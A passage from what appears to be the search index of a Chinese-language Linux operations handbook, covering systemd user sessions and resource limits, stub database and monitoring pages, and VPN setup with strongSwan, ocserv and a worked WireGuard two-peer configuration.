\u200b\u670d\u52a1\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\uff08\u200b\u4e00\u822c\u200b\u8def\u5f84\u200b\u4e3a\u200b <code>/run/user/&lt;\u200b\u7528\u6237\u200b PID&gt;/bus</code>\uff09\u3002</p> <p>\u200b\u5728\u200b\u547d\u4ee4\u884c\u200b\u4e0b\u200b\u9700\u8981\u200b\u5207\u6362\u200b\u7528\u6237\u200b\u7684\u200b\u573a\u5408\u200b\u4e2d\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u7528\u6237\u200b\u7ea7\u522b\u200b\u7684\u200b systemd\uff0c\u200b\u63a8\u8350\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> <ul> <li><code>machinectl shell username@</code></li> <li><code>run0</code>\uff08\u200b\u9700\u8981\u200b\u5f88\u200b\u65b0\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\uff0c\u200b\u5982\u200b Debian 13\uff09</li> </ul> <p>\u200b\u76f8\u5173\u200b\u8bbe\u8ba1\u200b\u539f\u56e0\u200b\u53ef\u200b\u9605\u8bfb\u200b https://github.com/systemd/systemd/issues/7451#issuecomment-346787237\u3002\u200b\u6ce8\u610f\u200b\uff0c\u200b\u4ee5\u4e0a\u200b\u65b9\u6cd5\u200b\u5bf9\u975e\u200b root \u200b\u4f7f\u7528\u200b polkit \u200b\u9274\u6743\u200b\uff0c\u200b\u4e0e\u200b sudo \u200b\u914d\u7f6e\u200b\u65e0\u5173\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>sudo</code> \u200b\u6216\u200b <code>su</code> \u200b\u5207\u6362\u200b\u7528\u6237\u200b\uff0c\u200b\u6216\u8005\u200b\u5728\u200b\u67d0\u4e9b\u200b\u975e\u5e38\u200b\u7279\u6b8a\u200b\u7684\u200b\u73af\u5883\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u914d\u7f6e\u200b <code>XDG_RUNTIME_DIR=/run/user/&lt;\u200b\u7528\u6237\u200b PID&gt;</code> \u200b\u4e0e\u200b <code>DBUS_SESSION_BUS_ADDRESS=/run/user/&lt;\u200b\u7528\u6237\u200b PID&gt;/bus</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\uff0c\u200b\u4ee5\u4fbf\u200b <code>systemctl</code> \u200b\u7b49\u200b\u547d\u4ee4\u200b\u80fd\u591f\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002</p> <p>\u200b\u6709\u4e9b\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u5728\u200b\u673a\u5668\u200b\u542f\u52a8\u200b\u65f6\u200b\uff0c\u200b\u7528\u6237\u200b session \u200b\u4e5f\u200b\u80fd\u591f\u200b\u521b\u5efa\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5373\u4f7f\u200b\u7528\u6237\u200b\u6ce8\u9500\u200b\u4e5f\u200b\u4e0d\u200b\u9500\u6bc1\u200b\u3002\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b lingering \u200b\u7684\u200b\u529f\u80fd\u200b\u3002\u200b\u4f7f\u7528\u200b <code>loginctl enable-linger &lt;user&gt;</code> \u200b\u547d\u4ee4\u200b\u5373\u53ef\u200b\u542f\u7528\u200b\u3002</p> <p>\u200b\u9650\u5236\u200b\u7528\u6237\u200b\u7684\u200b\u8d44\u6e90\u200b\u4f7f\u7528\u200b</p> <p>\u200b\u7528\u6237\u200b session \u200b\u542f\u52a8\u200b\u65f6\u200b\uff0csystemd \u200b\u4f1a\u200b\u521b\u5efa\u200b <code>user-&lt;uid&gt;.slice</code>\u3002Slice \u200b\u662f\u200b systemd \u200b\u4e2d\u200b\u7528\u4e8e\u200b\u9650\u5236\u200b\u8d44\u6e90\u200b\u7684\u200b unit\uff0c\u200b\u5c06\u200b\u591a\u4e2a\u200b service \u200b\u7b49\u200b unit \u200b\u7ec4\u7ec7\u200b\u5728\u200b\u4e00\u8d77\u200b\u8fdb\u884c\u200b\u7edf\u4e00\u200b\u7684\u200b\u8d44\u6e90\u200b\u9650\u5236\u200b\u3002\u200b\u4e3a\u200b\u7528\u6237\u200b\u9650\u5236\u200b\u8d44\u6e90\u200b\u4f7f\u7528\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b\u5b9e\u9a8c\u5ba4\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u3002\u200b\u5728\u200b\u7528\u200b\u7684\u200b\u4eba\u591f\u200b\u591a\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u6bcf\u200b\u8fc7\u200b\u51e0\u5929\u200b\u5c31\u200b\u4f1a\u200b\u6709\u4eba\u200b\u628a\u200b\u670d\u52a1\u5668\u200b\u7684\u200b CPU\u3001\u200b\u5185\u5b58\u200b\u6216\u8005\u200b IO \u200b\u5168\u90e8\u200b\u5403\u200b\u6ee1\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ea\u80fd\u200b\u91cd\u542f\u200b\u3002</p> <p>\uff08\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u60c5\u51b5\u200b\u662f\u200b\uff0c\u200b\u6709\u4eba\u200b\u5728\u200b\u7f16\u8bd1\u200b\u8f6f\u4ef6\u200b\u65f6\u200b\uff0c\u200b\u8dd1\u200b\u4e86\u200b\u4e0d\u200b\u9650\u5236\u200b\u5e76\u53d1\u200b\u7684\u200b <code>make -j</code>\uff09</p> <p>\u200b\u8bf7\u200b\u5c1d\u8bd5\u200b\u9650\u5236\u200b\u8ba9\u200b\u6bcf\u4e2a\u200b\u7528\u6237\u200b CPU \u200b\u6700\u200b\u591a\u53ea\u200b\u4f7f\u7528\u200b 30%\uff0c\u200b\u5185\u5b58\u200b\u6700\u200b\u591a\u53ea\u200b\u4f7f\u7528\u200b 8G\uff08\u200b\u53ef\u200b\u9605\u8bfb\u200b user@.service(5)\uff09\u3002</p>"},{"location":"ops/database/","title":"\u6570\u636e\u5e93\u7cfb\u7edf","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u5e38\u89c1\u200b\u7684\u200b\u6570\u636e\u5e93\u200b\u7684\u200b\u4f7f\u7528\u200b\u4e0e\u200b\u7ba1\u7406\u200b\u3002</p>"},{"location":"ops/database/kv/","title":"\u952e\u503c\u200b\u6570\u636e\u5e93","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u952e\u503c\u200b\u6570\u636e\u5e93\u200b Redis\uff08\u200b\u4ee5\u53ca\u200b\u5176\u200b fork \u200b\u5206\u652f\u200b\uff09\u200b\u7684\u200b\u4f7f\u7528\u200b\u4e0e\u200b\u7ba1\u7406\u200b\u3002</p>"},{"location":"ops/database/rdbms/","title":"\u5173\u7cfb\u200b\u578b\u200b\u6570\u636e\u5e93","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u5e38\u7528\u200b\u7684\u200b\u5173\u7cfb\u200b\u578b\u200b\u6570\u636e\u5e93\u200b\u7684\u200b\u4f7f\u7528\u200b\u4e0e\u200b\u7ba1\u7406\u200b\uff0c\u200b\u5305\u62ec\u200b SQLite\u3001MariaDB\uff08MySQL\uff09\u200b\u548c\u200b PostgreSQL\u3002</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u5047\u8bbe\u200b\u8bfb\u8005\u200b\u5df2\u7ecf\u200b\u4e86\u89e3\u200b\u5173\u7cfb\u200b\u578b\u200b\u6570\u636e\u5e93\u200b\u7684\u200b\u57fa\u672c\u6982\u5ff5\u200b\u548c\u200b\u7b80\u5355\u200b\u7684\u200b SQL \u200b\u8bed\u8a00\u200b\u4f7f\u7528\u200b\u3002</p>"},{"location":"ops/monitor/","title":"\u6307\u6807\u200b\u76d1\u63a7\u200b\u4e0e\u200b\u544a\u8b66","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b\u6307\u6807\u200b\u76d1\u63a7\u200b\u3001\u200b\u544a\u8b66\u200b\u76f8\u5173\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5305\u62ec\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\uff1a</p> <ul> <li>\u200b\u672c\u200b\u673a\u200b\u6307\u6807\u200b\uff1asar\u3001netdata</li> <li>\u200b\u96c6\u7fa4\u200b\u6307\u6807\u200b\u6536\u96c6\u200b\u65b9\u6848\u200b\uff1a<ul> <li>Telegraf + InfluxDB</li> <li>Prometheus</li> </ul> </li> <li>Grafana \u200b\u4ecb\u7ecd\u200b</li> </ul>"},{"location":"ops/monitor/grafana/","title":"Grafana","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"ops/monitor/local/","title":"\u672c\u200b\u673a\u200b\u6307\u6807\u200b\u6536\u96c6","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"ops/monitor/prometheus/","title":"Prometheus","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"ops/monitor/telegraf/","title":"Telegraf + InfluxDB","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"ops/network/","title":"\u7f51\u7edc\u7cfb\u7edf","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b Linux \u200b\u7f51\u7edc\u7cfb\u7edf\u200b\u7684\u200b\u57fa\u7840\u77e5\u8bc6\u200b\u3002</p>"},{"location":"ops/network/intro/","title":"\u57fa\u7840\u77e5\u8bc6\u200b\u7b80\u4ecb","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"ops/network/intro/#network-layering","title":"\u5c42\u6b21\u7ed3\u6784","text":"<p>\u200b\u8ba1\u7b97\u673a\u7f51\u7edc\u200b\u6709\u200b\u4e24\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u5c42\u6b21\u6a21\u578b\u200b\uff0c\u200b\u5206\u522b\u200b\u662f\u200b OSI \u200b\u6a21\u578b\u200b\u548c\u200b TCP/IP \u200b\u6a21\u578b\u200b\u3002 OSI \u200b\u6a21\u578b\u200b\u5c06\u200b\u7f51\u7edc\u901a\u4fe1\u200b\u5206\u4e3a\u200b\u4e03\u4e2a\u200b\u5c42\u6b21\u200b\uff0c\u200b\u504f\u5411\u200b\u4e8e\u200b\u7406\u8bba\u200b\u7814\u7a76\u200b\uff1b\u200b\u800c\u200b TCP/IP \u200b\u6a21\u578b\u200b\u5219\u200b\u5c06\u200b\u5176\u200b\u7b80\u5316\u200b\u4e3a\u200b\u56db\u4e2a\u200b\u5c42\u6b21\u200b\uff0c\u200b\u66f4\u52a0\u200b\u8d34\u8fd1\u200b\u5b9e\u9645\u200b\u5e94\u7528\u200b\u3002</p> <p></p>"},{"location":"ops/network-service/","title":"\u7f51\u7edc\u670d\u52a1\u200b\u5b9e\u8df5","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u5728\u200b Linux \u200b\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u200b\u7684\u200b\u4e00\u4e9b\u200b\u7f51\u7edc\u670d\u52a1\u200b\u5b9e\u8df5\u200b\u3002</p> <p>\u200b\u5176\u4e2d\u200b\u7f51\u7edc\u200b\u5b58\u50a8\u7cfb\u7edf\u200b\u7684\u200b\u5b9e\u8df5\u200b\u8bf7\u200b\u53c2\u8003\u200b \u200b\u5b58\u50a8\u7cfb\u7edf\u200b/\u200b\u7f51\u7edc\u200b\u5b58\u50a8\u7cfb\u7edf\u200b\u3002</p>"},{"location":"ops/network-service/intranet/","title":"\u96a7\u9053\u200b\u7ec4\u7f51","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@yuanyiwei\u3001@sscscc\u3001@tiankaima</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u5728\u200b\u7f51\u7edc\u200b\u4e2d\u200b\uff0c\u200b\u96a7\u9053\u200b\u662f\u200b\u4e00\u79cd\u200b\u5c06\u200b\u6570\u636e\u5305\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u7f51\u7edc\u200b\u8282\u70b9\u200b\u5c01\u88c5\u200b\u5e76\u200b\u4f20\u8f93\u200b\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7f51\u7edc\u200b\u8282\u70b9\u200b\u7684\u200b\u6280\u672f\u200b\u3002\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u5728\u200b\u4e24\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b\u7f51\u7edc\u200b\u4e4b\u95f4\u200b\u5efa\u7acb\u200b\u865a\u62df\u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u7ed5\u8fc7\u200b\u9632\u706b\u5899\u200b\u6216\u200b\u5176\u4ed6\u200b\u7f51\u7edc\u200b\u9650\u5236\u200b\u3002</p> <p>\u200b\u5728\u200b\u96a7\u9053\u200b\u4e2d\u200b\uff0c\u200b\u6570\u636e\u5305\u200b\u4f1a\u200b\u88ab\u200b\u5c01\u88c5\u200b\u5728\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u6570\u636e\u5305\u200b\u4e2d\u200b\uff0c\u200b\u5e76\u200b\u4f7f\u7528\u200b\u96a7\u9053\u200b\u534f\u8bae\u200b\u8fdb\u884c\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u5728\u200b\u865a\u62df\u200b\u4e13\u7528\u200b\u7f51\u7edc\u200b\uff08VPN\uff09\u200b\u4e2d\u200b\uff0c\u200b\u96a7\u9053\u200b\u7528\u4e8e\u200b\u5c06\u200b\u7528\u6237\u200b\u8bbe\u5907\u200b\u4e0e\u200b VPN \u200b\u670d\u52a1\u5668\u4e4b\u95f4\u200b\u7684\u200b\u901a\u4fe1\u200b\u52a0\u5bc6\u200b\u5e76\u200b\u5c01\u88c5\u200b\u3002\u200b\u8fd9\u200b\u4f7f\u5f97\u200b\u7528\u6237\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u5b89\u5168\u200b\u5730\u200b\u8fde\u63a5\u200b\u5230\u200b VPN \u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u5e76\u200b\u901a\u8fc7\u200b VPN \u200b\u670d\u52a1\u5668\u200b\u8bbf\u95ee\u200b\u53d7\u9650\u200b\u7684\u200b\u7f51\u7edc\u8d44\u6e90\u200b\uff0c\u200b\u901a\u5e38\u200b\u662f\u200b\u5185\u7f51\u200b\u73af\u5883\u200b\uff08IntraNet\uff09\u200b\u4e0b\u200b\u7684\u200b\u5404\u79cd\u200b\u670d\u52a1\u200b\u3002</p> <p>\u200b\u5982\u4eca\u200b\u7565\u663e\u200b\u9648\u65e7\u200b\u7684\u200b PPTP\u3001SSTP\u3001L2TP \u200b\u534f\u8bae\u200b\u4e0b\u9762\u200b\u4e0d\u518d\u200b\u63d0\u53ca\u200b\u3002\u200b\u4e00\u4e9b\u200b\u9ad8\u6821\u200b\u548c\u200b\u4f01\u4e1a\u200b\u4f7f\u7528\u200b\u7684\u200b\u6df1\u200b\u4fe1\u670d\u200b EasyConnect \u200b\u7531\u4e8e\u200b\u670d\u52a1\u7aef\u200b\u5e76\u672a\u200b\u653e\u51fa\u200b\uff0c\u200b\u4e14\u200b\u5176\u200b\u4ecd\u200b\u5728\u200b\u4f7f\u7528\u200b\u8fc7\u65f6\u200b\u7684\u200b Java applet \u200b\u5b9e\u73b0\u200b SSL VPN\uff0c\u200b\u56e0\u6b64\u200b\u7565\u8fc7\u200b\u3002</p>"},{"location":"ops/network-service/intranet/#ipsec","title":"IPsec","text":"<p>\u200b\u6807\u51c6\u5316\u200b\u7a0b\u5ea6\u200b\u9ad8\u200b\uff0c\u200b\u652f\u6301\u200b\u5e7f\u6cdb\u200b</p>"},{"location":"ops/network-service/intranet/#gre-over-ipsec","title":"GRE over IPsec","text":""},{"location":"ops/network-service/intranet/#ikev2","title":"IKEv2","text":"<p>IKEv2 \u200b\u662f\u200b\u4e00\u79cd\u200b\u5b89\u5168\u6027\u200b\u9ad8\u200b\u3001\u200b\u6613\u4e8e\u200b\u914d\u7f6e\u200b\u7684\u200b VPN \u200b\u534f\u8bae\u200b\uff0c\u200b\u7531\u200b IPsec \u200b\u8d1f\u8d23\u200b\u6570\u636e\u200b\u7684\u200b\u4f20\u8f93\u200b\u5b89\u5168\u200b\uff0c\u200b\u57fa\u4e8e\u200b UDP \u200b\u534f\u8bae\u200b\u3002\u200b\u5927\u90e8\u5206\u200b\u7cfb\u7edf\u200b\u90fd\u200b\u5185\u5efa\u200b\u4e86\u200b\u5bf9\u200b IKEv2 \u200b\u534f\u8bae\u200b\u7684\u200b\u652f\u6301\u200b\u3002</p>"},{"location":"ops/network-service/intranet/#strongswan","title":"\u5b89\u88c5\u200b strongSwan","text":"<p>\u200b\u5728\u200b Linux \u200b\u4e0a\u200b\u7684\u200b\u5f00\u6e90\u200b IKEv2/IPsec \u200b\u5b9e\u73b0\u200b\u6709\u200b strongSwan\u3001Libreswan\uff0c\u200b\u548c\u200b\u5df2\u7ecf\u200b\u505c\u6b62\u200b\u66f4\u65b0\u200b\u7684\u200b Openswan\u3002\u200b\u672c\u6587\u200b\u4f7f\u7528\u200b strongSwan\u3002</p> <p>\u200b\u5927\u591a\u6570\u200b\u73b0\u4ee3\u200b Linux \u200b\u53d1\u884c\u7248\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4ece\u200b\u5b98\u65b9\u200b\u4ed3\u5e93\u200b\u4e2d\u200b\u5b89\u88c5\u200b strongSwan\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5728\u200b\u57fa\u4e8e\u200b Debian \u200b\u7684\u200b\u7cfb\u7edf\u200b\uff08\u200b\u5982\u200b Ubuntu\uff09\u200b\u4e0a\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u5b89\u88c5\u200b\uff1a</p> <pre><code>sudo apt update\nsudo apt install strongswan\n</code></pre> <p>strongSwan \u200b\u5f53\u524d\u200b\u63d0\u4f9b\u200b\u591a\u79cd\u200b daemon\uff1a</p> <ul> <li><code>strongswan-starter.service</code> \u200b\u6765\u81ea\u200b <code>strongswan-starter</code></li> <li><code>strongswan.service</code> \u200b\u6765\u81ea\u200b <code>charon-systemd</code></li> </ul> <p>TODO</p> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u5982\u200b yangzhaofengsteven/strongswan \u200b\u7b49\u200b docker \u200b\u955c\u50cf\u200b\u3002</p>"},{"location":"ops/network-service/intranet/#_2","title":"\u914d\u7f6e\u200b\u8bc1\u4e66\u200b\u548c\u200b\u8def\u7531","text":""},{"location":"ops/network-service/intranet/#anyconnect","title":"AnyConnect","text":"<p>AnyConnect \u200b\u662f\u200b\u7531\u200b\u601d\u79d1\u200b\u5f00\u53d1\u200b\u7684\u200b\u4e13\u7528\u200b VPN \u200b\u534f\u8bae\u200b\uff0c\u200b\u7531\u200b TLS \u200b\u8d1f\u8d23\u200b\u6570\u636e\u200b\u7684\u200b\u4f20\u8f93\u200b\u5b89\u5168\u200b\u3002\u200b\u5176\u200b\u5ba2\u6237\u7aef\u200b\u6613\u4e8e\u200b\u4f7f\u7528\u200b\u3001\u200b\u5e76\u4e14\u200b\u8de8\u5e73\u53f0\u200b\uff0c\u200b\u8be5\u200b\u534f\u8bae\u200b\u8f83\u4e3a\u200b\u6d41\u884c\u200b\u3002</p> <p>\u200b\u7136\u800c\u200b AnyConnect \u200b\u4f5c\u4e3a\u200b Cisco \u200b\u4e13\u6709\u200b\u534f\u8bae\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e00\u822c\u200b\u4f7f\u7528\u200b\u517c\u5bb9\u200b AnyConnect \u200b\u534f\u8bae\u200b\u7684\u200b\u670d\u52a1\u7aef\u200b openconnect/ocserv\u3002</p>"},{"location":"ops/network-service/intranet/#ocserv","title":"\u5b89\u88c5\u200b ocserv","text":"<p>yangzhaofengsteven/ocserv docker \u200b\u955c\u50cf\u200b</p>"},{"location":"ops/network-service/intranet/#openvpn","title":"OpenVPN","text":"<p>OpenVPN \u200b\u662f\u200b\u4e00\u6b3e\u200b\u5f00\u6e90\u200b\u7684\u200b VPN \u200b\u534f\u8bae\u200b\uff0c\u200b\u4f7f\u7528\u200b TLS \u200b\u8fdb\u884c\u200b\u8ba4\u8bc1\u200b\u3002\u200b\u76f8\u6bd4\u200b\u5176\u4ed6\u200b\u534f\u8bae\u200b\uff0c\u200b\u5176\u200b\u670d\u52a1\u7aef\u200b\u6027\u80fd\u200b\u5f00\u9500\u200b\u8f83\u5927\u200b\u3002</p>"},{"location":"ops/network-service/intranet/#wireguard","title":"WireGuard","text":"<p>WireGuard \u200b\u662f\u200b\u4e00\u79cd\u200b\u73b0\u4ee3\u200b\u7684\u200b VPN \u200b\u534f\u8bae\u200b\uff0c\u200b\u901f\u5ea6\u200b\u5feb\u200b\u3001\u200b\u914d\u7f6e\u200b\u7b80\u5355\u200b\u3001\u200b\u5b89\u5168\u6027\u200b\u826f\u597d\u200b\uff0c\u200b\u57fa\u4e8e\u200b UDP \u200b\u534f\u8bae\u200b\u3002</p>"},{"location":"ops/network-service/intranet/#wireguard_1","title":"\u5b89\u88c5\u200b WireGuard","text":"<p>\u200b\u5927\u591a\u6570\u200b\u73b0\u4ee3\u200b Linux \u200b\u53d1\u884c\u7248\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4ece\u200b\u5b98\u65b9\u200b\u4ed3\u5e93\u200b\u4e2d\u200b\u5b89\u88c5\u200b WireGuard\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5728\u200b\u57fa\u4e8e\u200b Debian \u200b\u7684\u200b\u7cfb\u7edf\u200b\uff08\u200b\u5982\u200b Ubuntu\uff09\u200b\u4e0a\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u5b89\u88c5\u200b\uff1a</p> <pre><code>sudo apt update\nsudo apt install wireguard\n</code></pre> <p>\u200b\u5728\u200b Red Hat \u200b\u6216\u200b Fedora \u200b\u7cfb\u5217\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>dnf</code>\uff1a</p> <pre><code>sudo dnf install wireguard-tools\n</code></pre>"},{"location":"ops/network-service/intranet/#_3","title":"\u751f\u6210\u200b\u5bc6\u94a5\u200b\u5bf9","text":"<p>\u200b\u6bcf\u4e2a\u200b WireGuard \u200b\u63a5\u53e3\u200b\u90fd\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u79c1\u94a5\u200b\u548c\u200b\u516c\u94a5\u200b\u3002<code>wg genkey</code> \u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u79c1\u94a5\u200b\uff0c<code>wg pubkey</code> \u200b\u6839\u636e\u200b\u8f93\u5165\u200b\u7684\u200b\u79c1\u94a5\u200b\u8f93\u51fa\u200b\u516c\u94a5\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u547d\u4ee4\u200b\u751f\u6210\u200b\u5bc6\u94a5\u200b\u5bf9\u200b\uff1a</p> <pre><code>wg genkey | tee privatekey | wg pubkey &gt; publickey\n</code></pre> <p>\u200b\u8fd9\u200b\u5c06\u200b\u5728\u200b\u5f53\u524d\u76ee\u5f55\u200b\u4e0b\u200b\u751f\u6210\u200b\u4e24\u4e2a\u200b\u6587\u4ef6\u200b\uff1a<code>privatekey</code> \u200b\u548c\u200b <code>publickey</code>\u3002</p>"},{"location":"ops/network-service/intranet/#wg-quick-wireguard","title":"\u57fa\u4e8e\u200b <code>wg-quick</code> \u200b\u5de5\u5177\u200b\u8bbe\u7f6e\u200b WireGuard \u200b\u63a5\u53e3","text":"<p>\u200b\u8fd9\u91cc\u200b\u4ee5\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u573a\u666f\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u4e24\u53f0\u200b\u673a\u5668\u200b A \u200b\u548c\u200b B \u200b\u8fdb\u884c\u200b\u7ec4\u7f51\u200b\u3002\u200b\u5176\u4e2d\u200b A \u200b\u6709\u200b\u516c\u7f51\u200b IP\uff0c\u200b\u5bf9\u5e94\u200b\u57df\u540d\u200b <code>example.com</code>\u3002</p> <p>A \u200b\u7684\u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>[Interface]\nAddress = 10.0.0.1/24\nListenPort = 51820\nPrivateKey = &lt;A \u200b\u7684\u200b\u79c1\u94a5\u200b&gt;\n\n[Peer]\nPublicKey = &lt;B \u200b\u7684\u200b\u516c\u94a5\u200b&gt;\nAllowedIPs = 10.0.0.4/32\n</code></pre> <p>B \u200b\u7684\u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>[Interface]\nAddress = 10.0.0.4/24\nPrivateKey = &lt;B \u200b\u7684\u200b\u79c1\u94a5\u200b&gt;\n\n[Peer]\nPublicKey = &lt;A \u200b\u7684\u200b\u516c\u94a5\u200b&gt;\nEndpoint = example.com:51820\nAllowedIPs = 10.0.11.0/24\nPersistentKeepalive = 25\n</code></pre> <p>\u200b\u4e0a\u8ff0\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u5bc6\u94a5\u200b\u7684\u200b\u66ff\u6362\u6210\u200b\u5bc6\u94a5\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u5bc6\u94a5\u200b\u6587\u4ef6\u200b\u7684\u200b\u8def\u5f84\u200b\u3002</p> <p>\u200b\u8bbe\u5907\u200b A \u200b\u7684\u200b VPN \u200b\u5185\u90e8\u200b IP \u200b\u5730\u5740\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b <code>10.0.0.1</code>\uff0c\u200b\u8bbe\u5907\u200b B \u200b\u7684\u200b VPN \u200b\u5185\u90e8\u200b IP \u200b\u5730\u5740\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b <code>10.0.0.4</code>\uff0c\u200b\u5b50\u7f51\u63a9\u7801\u200b\u4e3a\u200b 24 \u200b\u4f4d\u200b\u3002</p> <p><code>PersistentKeepalive = 25</code> \u200b\u4ee3\u8868\u200b\u6bcf\u200b 25 \u200b\u79d2\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b\u65e0\u200b\u5b9e\u8d28\u200b\u6570\u636e\u200b\u7684\u200b\u5fc3\u8df3\u200b\u5305\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5728\u200b NAT \u200b\u6216\u200b\u9632\u706b\u5899\u200b\u73af\u5883\u200b\u4e2d\u200b\u4fdd\u6301\u200b\u8fde\u63a5\u200b\u6d3b\u8dc3\u200b\u3002</p> <p><code>AllowedIPs</code> \u200b\u6307\u5b9a\u200b\u4e86\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b VPN \u200b\u53d1\u9001\u5230\u200b\u54ea\u4e9b\u200b IP \u200b\u5730\u5740\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u4f8b\u5982\u200b <code>10.0.0.1/32</code> \u200b\u8868\u793a\u200b\u53ea\u6709\u200b\u76ee\u6807\u200b\u4e3a\u200b <code>10.0.0.1</code> \u200b\u7684\u200b\u6570\u636e\u5305\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b VPN \u200b\u53d1\u9001\u7ed9\u200b\u5bf9\u65b9\u200b\u3002</p> <p>\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u9700\u8981\u200b\u5199\u200b\u5728\u200b <code>/etc/wireguard/&lt;\u200b\u914d\u7f6e\u200b\u540d\u200b&gt;.conf</code> \u200b\u4e2d\u200b\u3002\u200b\u4f8b\u5982\u200b\uff1a<code>/etc/wireguard/wg0.conf</code>\u3002</p>"},{"location":"ops/network-service/intranet/#wireguard_2","title":"\u542f\u505c\u200b WireGuard \u200b\u63a5\u53e3","text":"<p>\u200b\u4f7f\u7528\u200b <code>wg-quick</code> \u200b\u5de5\u5177\u200b\u542f\u52a8\u200b WireGuard \u200b\u63a5\u53e3\u200b\uff1a</p> <pre><code>sudo wg-quick up wg0\nsudo wg-quick down wg0\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>wg0</code> 